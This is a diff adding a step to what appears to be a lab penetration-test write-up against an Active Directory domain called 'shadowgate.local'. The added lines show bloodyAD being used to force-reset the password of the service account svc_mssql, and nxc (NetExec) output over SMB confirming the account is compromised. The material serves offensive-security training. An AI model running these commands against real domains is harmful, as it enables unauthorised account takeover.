@@ -471,5 +471,15 @@ This gives me a few options, change the user password, targeted kerberoast or a 
 Since this is a lab environment ill just change the users password, but in real life this is bad OPSEC
 
 ```python
-
+bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u milo.w -p 'Password123!' set password 'svc_mssql' 'Password123!'
+[+] Password changed successfully!
 ```
+
+```python
+nxc smb sg-dc01.shadowgate.local -u svc_mssql -p 'Password123!'         
+SMB         10.1.232.232    445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.232.232    445    SG-DC01          [+] shadowgate.local\svc_mssql:Password123!
+```
+
+Now this user is compromised!
+
